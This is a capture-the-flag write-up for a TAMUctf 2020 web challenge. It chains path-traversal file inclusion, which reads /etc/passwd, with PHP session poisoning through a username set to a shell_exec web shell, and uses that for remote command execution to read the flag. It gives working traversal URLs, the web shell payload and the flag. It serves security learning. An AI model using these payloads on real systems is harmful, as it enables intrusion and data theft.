# FILESTORAGE Writeup

### TAMUctf 2020 - Web 122

> Try out my new file sharing site!
>
> http://filestorage.tamuctf.com

#### LFI

I notice file path can be controlled by user. Check LFI by trying to read `/etc/passwd`.

- `http://filestorage.tamuctf.com/index.php?file=../../../../../etc/passwd`

```
root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

LFI triggered.

#### php session poisoning

Check the cookie and get `PHPSESSID`. Session exist at `sess_{PHPSESSID}`. The service is maintained by using session. From [https://github.com/w181496/Web-CTF-Cheatsheet#php-session](https://github.com/w181496/Web-CTF-Cheatsheet#php-session). To trigger php session poisoning, I need to find where the session file exists. Guessing!

- `http://filestorage.tamuctf.com/index.php?file=../../../../../tmp/sess_5lpmadkrnrft9a18hbbrshrond`

Find where session is located by using LFI. Set user name as `<?php echo shell_exec($_GET["command"]); ?>`. Use LFI to access session file and trigger session poisoning.

#### RCE

Set GET paramter `command` to get RCE. Access session file to get command output. Guess where flag is.

- `http://filestorage.tamuctf.com/index.php?file=../../../../../tmp/sess_5lpmadkrnrft9a18hbbrshrond&command=cat%20../../../../flag_is_here/flag.txt`

I read flag:

```
gigem{535510n_f1l3_p0150n1n6}
```